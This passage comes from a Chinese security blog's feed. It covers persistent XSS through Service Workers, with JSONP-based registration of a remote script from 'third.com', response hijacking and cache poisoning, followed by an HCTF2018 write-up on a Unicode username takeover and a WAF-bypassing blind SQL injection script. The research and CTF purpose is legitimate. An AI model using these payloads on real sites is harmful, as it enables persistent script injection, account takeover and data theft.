title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;    var url=&quot;//localhost/serviceworker.js&quot;;    if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(url) .then(function(registration) { console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope); })};&lt;/script&gt;normal visit</code></pre><p>script标签下的type必须指明为<code>text/javascript</code></p><h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p><pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的responseself.addEventListener(&#39;fetch&#39;, function (event) {      var url = event.request.clone();     body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;;    init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }};    if(url.url==&#39;http://localhost/reurl.html&#39;){        res  = new Response(body,init);        event.respondWith(res.clone());    }});</code></pre><h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p><p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p><pre><code>&lt;?php// JSONP 回调名缺少校验$cb_name = $_GET[&#39;callback&#39;];$cb_data = time();header(&#39;Content-Type: application/javascript&#39;);echo(&quot;$cb_name($cb_data)&quot;);</code></pre><p>attack_js</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;    if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(url) .then(function(registration) { console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope); })};&lt;/script&gt;</code></pre><p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p><p>或者鸡肋上传一个html到网站下</p><pre><code>&lt;html&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; &lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;    if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(url) .then(function(registration) { console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope); })};&lt;/script&gt;it&#39;s nothing&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul><li>存在有缺陷的 JSONP 接口</li><li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li><li>JSONP 返回的 Content-Type 必须是 JS 类型</li><li>存在 XSS 的页面</li></ul><p>在网上看到一个师傅这样作例,引用一下：<br>service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）</p><h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p><h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p><p>下面是一个缓存读取/判断的demo</p><pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))self.addEventListener(&#39;fetch&#39;, function (event) {          event.respondWith(            //console.log(event.request)        caches.match(event.request).then(function(res){        if(res){//如果有缓存则使用缓存        return res;        }        return requestBackend(event);//没缓存就进行缓存        })        )   });function requestBackend(event){          var url = event.request.clone();          console.log(url)  //打印内容是打印到请求页面        if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }})        }        return fetch(url).then(function(res){        //检测是否为有效响应        if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){        return res;        }        var response = res.clone();        caches.open(&#39;v1&#39;).then(function(cache){  //打开v1缓存进行存储        cache.put(event.request, response);        });        return res;        })}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p><p>控制台输入下面的恶意代码</p><pre><code>async function replay() {    const name = &#39;xx&#39;    const url = &#39;xx&#39;    const payload = `alert(1);`    let cache = await caches.open(name);    let req = new Request(url);    let res = new Response(payload + replay + &#39;;replay()&#39;);   //执行alert+写入cache内容+执行fn    setInterval(_ =&gt; {      cache.put(req, res.clone());    }, 500);}replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p><p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RootkitXSS之ServiceWorker&quot;&gt;&lt;a href=&quot;#RootkitXSS之ServiceWorker&quot; class=&quot;headerlink&quot; title=&quot;RootkitXSS之ServiceWorker&quot;&gt;&lt;/a&gt;RootkitXSS之Ser
      
    
    </summary>
    
    
      <category term="XSS测试" scheme="https://hpdoger.cn/tags/XSS%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018线上赛部分WriteUp</title>
    <link href="https://hpdoger.cn/2018/11/13/HCTF%E9%A2%98%E8%A7%A3/"/>
    <id>https://hpdoger.cn/2018/11/13/HCTF题解/</id>
    <published>2018-11-12T16:00:00.000Z</published>
    <updated>2019-01-08T03:14:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HCTF题解"><a href="#HCTF题解" class="headerlink" title="HCTF题解"></a>HCTF题解</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>提示只有admin才能查看</p><p>注册账号功能，发现注册大写和小写会提示重名注册。<br>也就是说 ADMIN&lt;=&gt;admin</p><p>有一篇文章将Unicode安全，提到的一个python函数canonical_username，这个函数会把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big。ᴬᴬᴬ，经过函数处理<br>后变成了AAA</p><ol><li>我们注册形似ADMIN的名字</li><li>后台函数处理把形似ADMIN转换为ADMIN</li><li>修改ADMIN的密码，相当于修改admin的密码</li><li>登陆admin获得flag</li></ol><p>相当于一个越权</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Unicode安全：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>Unicode近似字合集:<a href="https://www.compart.com/en/unicode/category/Lm" target="_blank" rel="noopener">https://www.compart.com/en/unicode/category/Lm</a></p><h1 id="kznoe"><a href="#kznoe" class="headerlink" title="kznoe"></a>kznoe</h1><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>拿到题目发现砝码泄露,down了一份<a href="http://www.zip开始审" target="_blank" rel="noopener">www.zip开始审</a></p><p>一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码</p><pre><code>INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES(1, &#39;admin&#39;, &#39;21232f297a57a5a743894a0e4a801fc3&#39;, &#39;小杰&#39;, &#39;1503816935&#39;, 1);</code></pre><p>登陆失败，被改了密码，开始审计</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>整个钓鱼网站的大致结构：<br><img src="https://i.loli.net/2018/11/13/5beac350d6b8e.png" alt><br>根目录index.php跳转页</p><h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>admin目录下是钓鱼后台的管理,login逻辑判断登陆</p><h3 id="include目录。"><a href="#include目录。" class="headerlink" title="include目录。"></a>include目录。</h3><p>include下是配置文件，common入口文件包含了过滤和验证内容，其中:</p><ol><li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<pre><code>function waf($string){ $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;; // and updatexml(1,concat(0x7e,database()) return preg_replace_callback($blacklist, function ($match) {     return &#39;@&#39; . $match[0] . &#39;@&#39;; }, $string);}</code></pre></li></ol><p>function safe($string)<br>{<br>    if (is_array($string)) {<br>        foreach ($string as $key =&gt; $val) {<br>            $string[$key] = safe($val);<br>        }<br>    } else {<br>        $string = waf($string);<br>    }<br>    return $string;<br>}</p><pre><code>匹配到这些会在关键字前后添加@2. member根据cookie判断是否已经登陆3. founction封装了一些功能函数4. db.class一些执行的sql语句## 思路### ip刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：![](https://i.loli.net/2018/11/13/5beac380388eb.jpg)不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通### bypass因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。### member.php当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方![](https://i.loli.net/2018/11/13/5beac35ebedb4.png)cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤![](https://i.loli.net/2018/11/13/5beac38e39abe.png)剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</code></pre><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import requests<br>import string</p><p>url = ‘<a href="http://kzone.2018.hctf.io/include/common.php&#39;" target="_blank" rel="noopener">http://kzone.2018.hctf.io/include/common.php&#39;</a><br>str1 = string.ascii_letters+string.digits+’{}!@#$*&amp;_,’</p><p>def check(payload):<br>    cookie={<br>        ‘PHPSESSID’:’8ehnp28ccr4ueh3gnfc3uqtau1’,<br>        ‘islogin’:’1’,<br>        ‘login_data’:payload<br>    }<br>    try:<br>        requests.get(url,cookies=cookie,timeout=3)<br>        return 0<br>    except:<br>        return 1</p><p>result=’’<br>for i in range(1,33):<br>    for j in str1:<br>        payload = ‘{“admin_user”:”admin&#39;/<strong>/and/</strong>/\u0069f(\u0061scii(\u0073ubstr((select/<strong>/table_name/</strong>/from/<strong>/inf\u006Frmation_schema.tables/</strong>/where/<strong>/table_schema\u003ddatabase()/</strong>/limit/<strong>/0,1),%s,1))\u003d&#39;%s&#39;,\u0073leep(4),1)/</strong>/and/<strong>/&#39;1”}’% (str(i),ord(j))<br>        payload = ‘{“admin_user”:”admin&#39;/</strong>/and/<strong>/\u0069f(\u0061scii(\u0073ubstr((select/</strong>/F1a9/<strong>/from/</strong>/F1444g),%s,1))\u003d%s,\u0073leep(4),1)/<strong>/and/</strong>/&#39;1”,”admin_pass”:”123”}’% (str(i),ord(j))<br>        #print(‘[+]’+payload)<br>        if check(payload):<br>            result += j<br>            break<br>    print(result)</p><pre><code>只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HCTF题解&quot;&gt;&lt;a href=&quot;#HCTF题解&quot; class=&quot;headerlink&quot; title=&quot;HCTF题解&quot;&gt;&lt;/a&gt;HCTF题解&lt;/h1&gt;&lt;h1 id=&quot;admin&quot;&gt;&lt;a href=&quot;#admin&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
</feed>
